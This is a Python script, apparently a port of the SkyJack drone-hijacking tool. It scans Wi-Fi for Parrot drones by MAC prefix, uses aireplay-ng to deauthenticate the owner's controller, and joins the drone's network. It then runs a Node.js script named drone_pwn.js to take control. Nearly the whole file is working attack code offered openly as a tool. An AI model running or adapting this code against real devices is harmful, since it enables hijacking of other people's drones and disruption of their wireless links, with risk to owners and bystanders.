#!/usr/bin/python

#1 aug 2019
#skyjack translation by Daniel de la Harpe
#adapted from Samy Kamkar skyjack.pl available at github.com/samyk/skyjack

#Parrot drone mac addresses from http://standards-oui.ieee.org/oui/oui.txt
droneMacs = ["90:03:B7","00:12:1C","90:3A:E6", "A0:14:3D", "00:12:1C", "00:26:7E"]


#declare wireless interface 
interface = "wlan0"

#relevant paths to needed applications
pathControlJs = "control/drone_pwn.js"
pathDhclient = "dhclient"
pathIwconfig = "iwconfig"
pathIfconfig = "ifconfig"
pathAirmon = "armon-ng"
pathAireplay = "aireplay-ng"
pathAircrack = "aircrack-ng"
pathAirodump = "airodump-ng"
pathNodejs = "nodejs"

#import subprocess to make calls to terminal
import os, subprocess, shlex, time
#DNull to redirect away from terminal, temp file to store output
DNull=open(os.devnull,'w')
tmpfilePath = "temp/droneAttack.csv"

import re
 

def scan(writeTo,interface):
    '''function to scan all wireless networks and produce a table in a txt file for further inspection'''
    table = ''
    stdout = []
    runtime=10
    table_start = re.compile('\sCH')
    startTime = time.time()

    subprocess.call([pathIfconfig, interface, "down"])
    airodump = subprocess.Popen([pathAirodump, interface], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True,bufsize=1)
    '''
    try:
        stdout,stderr=airodump.communicate(timeout=10)
        print(stdout)
    except Exception:
        print("")
    print(stdout)
    '''
    #stdout,stderr=airodump.communicate(timeout=10)
    #airodump.kill()
    #airodump.wait()
    #print(stdout)
    #exit()
    while time.time() < startTime + runtime:
        line = airodump.stdout.readline()
        if table_start.match(line):
            table = ''.join(stdout)
            stdout = []
        stdout.append(line)
    airodump.terminate()
    f=open(writeTo,'w+')
    f.write(table)
    f.close()

def parseAirodump():
    '''method to take airodump file and parse it into array format, returns clients and APs found even though we only use the APs at this point'''

    f = open(tmpfilePath,'r+')
    APs = []
    clients=[]
    section=True
    for line in f:
        if(not line.strip()): continue
        line=line.split()
        if(section):
            if(len(line[0].split(':')) ==6):
                APs.append(line)
            if(line[0]=="BSSID" and len(APs)>0):#could do this in a better way, as this assumes at least one AP was found, but if none were found we don't care anyway
                section=False
        else:
            if(len(line[0].split(':')) ==6):
                clients.append(line)


    return APs, clients

def checkParrot(APs):
    '''comparison of list of OUI's vs our list of parrot OUI's. -1 indicates none match else position in list of positive match is returned'''
    pos=0
    for AP in APs:
        if AP in droneMacs: return pos
        pos+=1
    return -1

def getConnectedClient(mac,clients):
    for client in clients:
        if mac == client[0]:
            return client[1]

def connect(essid):
    print("reconfiguring network card")
    subprocess.call([pathIfconfig, interface, 'down'])
    subprocess.call([pathIwconfig, interface, 'mode','managed'])
    print("Putting card back up")
    subprocess.call([pathIfconfig, interface,'up'])
    print("Switching to drones ssid {}".format(essid))
    subprocess.call([pathIwconfig, interface,'essid',"{}".format(essid)])
    subprocess.call([pathDhclient,interface])
def main():
    while(42):
        subprocess.call(["service", "NetworkManager", "stop"]) #need to turn this off to avoid interference
        print("scanning for networks")
        scan(tmpfilePath,interface)
        print("Parsing results")
        APlist,clients=parseAirodump()
        parrotFoundPos = checkParrot([i[0][:8] for i in APlist])
        #parrotFoundPos=1 #REMOVE: TEST LINE
        if(parrotFoundPos>-1):
            print("Parrot found, setting attack up")
            channel = APlist[parrotFoundPos][5]
            targetMAC = APlist[parrotFoundPos][0]
            client= getConnectedClient(APlist[parrotFoundPos][0],clients)
            essid=APlist[parrotFoundPos][8]
            print("Switching to WiFi channel {}".format(channel))
            subprocess.call([pathIwconfig,interface,"channel",channel])
            print("pwning with aireplay-ng, @{} with client {} and interface {}".format(targetMAC,client,interface))
            deuath=subprocess.Popen([pathAireplay, '-0','3','-a',targetMAC,'-c',client,interface],stderr=DNull)
            deuath.wait()
            print("Connecting")
            connect(essid)
            os.system("node {}".format(pathControlJs))
            break #REMOVE

            
main()
